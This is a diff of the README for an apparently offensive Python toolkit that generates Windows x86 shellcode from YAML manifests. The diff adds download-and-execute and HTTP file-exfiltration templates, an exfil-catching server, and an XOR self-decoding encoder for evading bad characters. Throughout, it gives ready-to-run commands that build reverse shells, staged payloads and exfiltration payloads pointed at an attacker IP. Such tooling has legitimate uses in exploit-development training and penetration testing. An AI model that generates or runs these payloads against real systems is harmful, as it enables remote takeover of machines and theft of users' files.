@@ -3,9 +3,9 @@
 A Python toolkit that takes a YAML manifest describing what your shellcode needs
 (APIs, strings, badchars) and produces:
 
-- `emitter_out/asm/generated.asm` — full x86 assembly (PEB walk + API resolution + payload)
-- `emitter_out/Documentation/contract.md` — stack layout map and API reference
-- `emitter_out/bin/shellcode.{bin,hex,py,c}` — assembled output in multiple formats (requires keystone or nasm)
+- `emitter_out/asm/generated.asm` -- full x86 assembly (PEB walk + API resolution + payload)
+- `emitter_out/Documentation/contract.md` -- stack layout map and API reference
+- `emitter_out/bin/shellcode.{bin,hex,py,c}` -- assembled output in multiple formats (requires keystone or nasm)
 
 ---
 
@@ -13,11 +13,11 @@ A Python toolkit that takes a YAML manifest describing what your shellcode needs
 
 ```bash
 # Run from repo root
-uv run -m Tools.emitter --help
+uv run emitter --help
 
-# Optional — enables binary assembly output
-pip install keystone-engine
-# or: install nasm and add to PATH
+# Assembly backend: nasm (preferred) or keystone-engine
+# nasm: install via package manager and add to PATH
+# keystone: pip install keystone-engine
 ```
 
 ---
@@ -25,9 +25,19 @@ pip install keystone-engine
 ## Quick start
 
 ```bash
+# Reverse shell
 uv run emitter Tools/emitter/manifests/revshell.yaml \
-    --lhost 192.168.1.10 --lport 4444 \
-    --out emitter_out/
+    --lhost 192.168.1.10 --lport 4444
+
+# HTTP download and run
+uv run emitter Tools/emitter/manifests/http_download.yaml \
+    --url "http://192.168.1.10:8000/payload.exe" \
+    --dst "C:\\Windows\\Temp\\payload.exe"
+
+# HTTP POST exfiltration
+uv run emitter Tools/emitter/manifests/http_exfil.yaml \
+    --url "http://192.168.1.10:8000/exfil" \
+    --src "C:\\Users\\admin\\secret.txt"
 ```
 
 The manifest's `template` field selects the payload template automatically.
@@ -36,10 +46,13 @@ Use `--template` only to override it.
 Outputs:
 ```
 [+] Generated: emitter_out/asm/generated.asm
+[+] Debug:     emitter_out/asm/debug_runner.py
+[+] Snippet:   emitter_out/asm/code_snippet.py
 [+] Contract:  emitter_out/Documentation/contract.md
-[+] Assembler: keystone
-[+] Shellcode: 512 bytes
+[+] Assembler: nasm
+[+] Shellcode: 826 bytes (raw)
 [+] Hex:       emitter_out/bin/shellcode.{bin,hex,py,c}
+[+] Harness:   emitter_out/bin/test_harness.py
 ```
 
 ---
@@ -47,7 +60,7 @@ Outputs:
 ## CLI reference
 
 ```
-uv run -m Tools.emitter <manifest> [options]
+uv run emitter <manifest> [options]
 
 Arguments:
   manifest              Path to YAML manifest file
@@ -55,11 +68,19 @@ Arguments:
 Options:
   --template NAME       Payload template to use (see Templates section)
   --out DIR             Output directory (default: emitter_out)
-  --lhost IP            Attacker IP (reverse shell / download templates)
-  --lport PORT          Attacker port
+  --lhost IP            Attacker IP or interface name (e.g. tun0).
+                        Auto-extracted from --url for http_download/http_exfil.
+  --lport PORT          Attacker port.
+                        Auto-extracted from --url for http_download/http_exfil.
   --command CMD         Command to run (run_command template, default: cmd.exe)
-  --src PATH            Source file path (copy_file / copy_then_run)
-  --dst PATH            Destination file path (tcp_download / copy_then_run)
+  --src PATH            Source file path on target (copy_file / http_exfil)
+  --dst PATH            Destination file path on target (tcp_download / http_download)
+  --url URL             Full URL for http_download (GET) or http_exfil (POST).
+                        Auto-derives --lhost/--lport when not explicitly set.
+  --payload-file PATH   Local file being served; sets VirtualAlloc size to
+                        match (rounded up to page boundary). Default: 1 MiB.
+  --encode              Apply single-byte XOR encoding with self-decoding stub
+                        when the assembled shellcode contains badchar violations.
   --no-assemble         Skip binary assembly, emit .asm only
 ```
 
@@ -161,7 +182,7 @@ Required strings: `src_path`, `dst_path`
 
 ### `tcp_download`
 Connects to `--lhost:--lport`, receives a file using the staging protocol, writes it to
-`--dst`, then executes it via `WinExec`. Never produces an executable stage — the file
+`--dst`, then executes it via `WinExec`. Never produces an executable stage -- the file
 lands on disk.
 
 ```bash
@@ -203,8 +224,91 @@ by `tcp_stage_server.py`.
 ---
 
 ### `bind_shell` (scaffold)
-Partial implementation — `WSAStartup` and `WSASocketA` are generated; `bind` / `listen` /
+Partial implementation -- `WSAStartup` and `WSASocketA` are generated; `bind` / `listen` /
 `accept` stubs are marked TODO. Complete manually.
+
+---
+
+### `http_download`
+Downloads a file over HTTP via WinInet and executes it. No Winsock setup needed --
+`wininet.dll` handles the full HTTP stack.
+
+```bash
+uv run emitter Tools/emitter/manifests/http_download.yaml \
+    --url "http://192.168.1.10:8000/payload.exe" \
+    --dst "C:\\Windows\\Temp\\payload.exe"
+```
+
+`--lhost` and `--lport` are auto-extracted from `--url` when not given explicitly.
+Use `--payload-file` to size the VirtualAlloc buffer to match the served file.
+
+Required functions: `LoadLibraryA`, `InternetOpenA`, `InternetOpenUrlA`,
+`InternetReadFile`, `InternetCloseHandle`, `VirtualAlloc`, `CreateFileA`,
+`WriteFile`, `CloseHandle`, `WinExec`
+Required variables: `inet_session`, `inet_url`, `virt_buf`, `file_handle`,
+`bytes_read`, `bytes_total`
+Required strings: `wininet_dll`, `user_agent`, `url`, `dst_path`
+
+Serve the file:
+```bash
+python3 -m http.server 8000 --bind 192.168.1.10
+```
+
+---
+
+### `http_exfil`
+Reads a file from the target and POSTs its contents to the attacker's HTTP server.
+Uses `CreateFileA` / `ReadFile` to read the file, then `InternetConnectA` /
+`HttpOpenRequestA` / `HttpSendRequestA` to POST it.
+
+```bash
+uv run emitter Tools/emitter/manifests/http_exfil.yaml \
+    --url "http://192.168.1.10:8000/exfil" \
+    --src "C:\\Users\\admin\\Desktop\\secret.txt" \
+    --payload-file secret.txt
+```
+
+Required functions: `LoadLibraryA`, `InternetOpenA`, `InternetConnectA`,
+`HttpOpenRequestA`, `HttpSendRequestA`, `InternetCloseHandle`, `VirtualAlloc`,
+`CreateFileA`, `ReadFile`, `CloseHandle`
+Required variables: `inet_session`, `inet_connect`, `inet_request`,
+`file_handle`, `virt_buf`, `bytes_read`, `bytes_total`
+Required strings: `wininet_dll`, `user_agent`, `exfil_host`, `url_path`,
+`http_post`, `src_path`
+
+Catch the POST:
+```bash
+python3 Tools/http_exfil_server.py --port 8000
+```
+
+The server saves each POST body as a timestamped `.bin` file.
+
+---
+
+### `move_then_run`
+Moves a file to a new location via `MoveFileA`, then executes it via `WinExec`.
+
+Required functions: `MoveFileA`, `WinExec`
+Required strings: `src_path`, `dst_path`
+
+---
+
+## XOR encoder
+
+When `--encode` is passed and the assembled shellcode contains badchar violations,
+the emitter applies a single-byte XOR encoding. It searches for a key byte (0x01-0xFF)
+that is not in the badchar set and does not appear in the raw shellcode, then:
+
+1. XORs every byte of the payload with that key
+2. Prepends a self-decoding stub that XORs the payload back at runtime
+
+The stub uses a `lods` / `xor` / `stos` loop and is position-independent.
+The final output is the stub + encoded payload, ready for delivery.
+
+```bash
+uv run emitter Tools/emitter/manifests/revshell.yaml \
+    --lhost 192.168.1.10 --lport 4444 --encode
+```
 
 ---
 
@@ -215,7 +319,7 @@ The emitter allocates a fixed frame with `mov ebp, esp` / `add esp, 0xfffffb00`
 
 | Zone | Offsets | Contents |
 |---|---|---|
-| Export context | `[ebp-0x04]` – `[ebp-0x18]` | PEB walk internals — **do not allocate here** |
+| Export context | `[ebp-0x04]` -- `[ebp-0x18]` | PEB walk internals -- **do not allocate here** |
 | Module bases | `[ebp-0x20]` + | One 4-byte slot per required DLL, in `MODULE_LOAD_ORDER` sequence |
 | API pointers | After module bases | One 4-byte slot per function, in manifest declaration order |
 | Variables | After API pointers | One 4-byte slot per variable, in manifest declaration order |
@@ -252,17 +356,36 @@ python Tools/tcp_stage_server.py --port 9002 --file emitter_out/stage2/bin/shell
 python Tools/tcp_stage_server.py --port 9003 --file payload.exe
 ```
 
-The server loops — each new connection gets a fresh copy of the file. Stop with Ctrl-C.
+The server loops -- each new connection gets a fresh copy of the file. Stop with Ctrl-C.
+
+---
+
+## Exfil server
+
+`Tools/http_exfil_server.py` catches HTTP POST requests and saves each body to disk.
+
+```bash
+# Listen on port 8000, save to current directory
+python3 Tools/http_exfil_server.py --port 8000
+
+# Save to a specific directory
+python3 Tools/http_exfil_server.py --port 8000 --out exfil_data/
+```
+
+Each POST body is saved as `YYYYMMDD_HHMMSS_<path>.bin`. The server prints the
+byte count and output path for each request.
+
+---
 
 ### Two-stage chain example
 
 ```bash
-# Build stage 1 — stager connecting to port 9002
+# Build stage 1 -- stager connecting to port 9002
 uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
     --template tcp_stager --lhost 192.168.1.10 --lport 9002 \
     --out emitter_out/stage1/
 
-# Build stage 2 — reverse shell connecting back on port 4444
+# Build stage 2 -- reverse shell connecting back on port 4444
 uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
     --template reverse_shell --lhost 192.168.1.10 --lport 4444 \
     --out emitter_out/stage2/
@@ -285,13 +408,13 @@ payload templates (IP addresses, ports, constants like `MAKEWORD(2,2)`), the emi
 uses `encode.py` helpers that compute a per-byte XOR mask:
 
 ```asm
-; IP 192.168.1.0 — last byte 0x00 is a badchar
+; IP 192.168.1.0 -- last byte 0x00 is a badchar
 mov  eax, 0xc1a902XX     ; encoded (no badchars)
-xor  eax, 0x01010101     ; mask (no badchars) → eax = 0xc0a80100
+xor  eax, 0x01010101     ; mask (no badchars) -> eax = 0xc0a80100
 mov  dword ptr [edi+0x04], eax
 ```
 
-The manifest `badchars` list is authoritative — it flows through to all encoding
+The manifest `badchars` list is authoritative -- it flows through to all encoding
 decisions automatically.
 
 ---
@@ -301,19 +424,23 @@ decisions automatically.
 ```bash
 # 1. Tests
 uv run pytest Tools/emitter/tests/ -q
-# Expect: 175 passed, 1 skipped
+# Expect: 326 passed, 1 deselected
 
 # 2. Each template builds
-uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
-    --template reverse_shell --lhost 192.168.1.10 --lport 4444 --out emitter_out/
-uv run -m Tools.emitter Tools/emitter/manifests/copy_then_run.yaml \
-    --template copy_then_run --out emitter_out/
-uv run -m Tools.emitter Tools/emitter/manifests/tcp_download.yaml \
-    --template tcp_download --lhost 192.168.1.10 --lport 9002 \
+uv run emitter Tools/emitter/manifests/revshell.yaml \
+    --lhost 192.168.1.10 --lport 4444 --out emitter_out/
+uv run emitter Tools/emitter/manifests/copy_then_run.yaml --out emitter_out/
+uv run emitter Tools/emitter/manifests/tcp_download.yaml \
+    --lhost 192.168.1.10 --lport 9002 \
     --dst "C:\\Windows\\Temp\\p.exe" --out emitter_out/
-uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
-    --template tcp_stager --lhost 192.168.1.10 --lport 9002 --out emitter_out/stage1/
-# Expect: [+] Generated + [+] Contract for each
+uv run emitter Tools/emitter/manifests/tcp_stager.yaml \
+    --lhost 192.168.1.10 --lport 9002 --out emitter_out/stage1/
+uv run emitter Tools/emitter/manifests/http_download.yaml \
+    --url "http://192.168.1.10:8000/payload.exe" --out emitter_out/
+uv run emitter Tools/emitter/manifests/http_exfil.yaml \
+    --url "http://192.168.1.10:8000/exfil" \
+    --src "C:\\secret.txt" --out emitter_out/
+# Expect: [+] Generated + [+] Shellcode for each
 
 # 3. Stage server round-trip
 python Tools/tcp_stage_server.py --port 9999 \
@@ -352,11 +479,16 @@ done
 ## Adding a new template
 
 1. Create `Tools/emitter/payload_templates/your_template.py` extending `PayloadTemplate`
-2. Declare `REQUIRED_FUNCTIONS` and `REQUIRED_VARIABLES`
-3. Implement `emit(self, layout, config)` — use `layout.slot(name).ebp_ref` for all stack references, never hardcode offsets
-4. Use `encode_dword` / `encode_word` / `safe_push_*` from `..encode` for any multi-byte immediate value
-5. Register the template in `_load_template()` and the `--template` choices list in `build.py`
+2. Implement `emit(self, layout, config)` -- use `layout.slot(name).ebp_ref` for all
+   stack references, never hardcode offsets
+3. Use `encode_dword` / `safe_push_*` / `safe_call_mem` from `..encode` for any
+   multi-byte immediate value
+4. Register the template in the `registry` dict in `_load_template()` in `build.py`
+5. Add the template name to `_VALID_TEMPLATES` in `schema.py` and the `--template`
+   choices list in `build.py`
 6. Add a manifest under `Tools/emitter/manifests/`
+7. The `probe_slots()` method auto-discovers which APIs, variables, and strings your
+   template uses -- no manual declarations needed
 
 ---
 
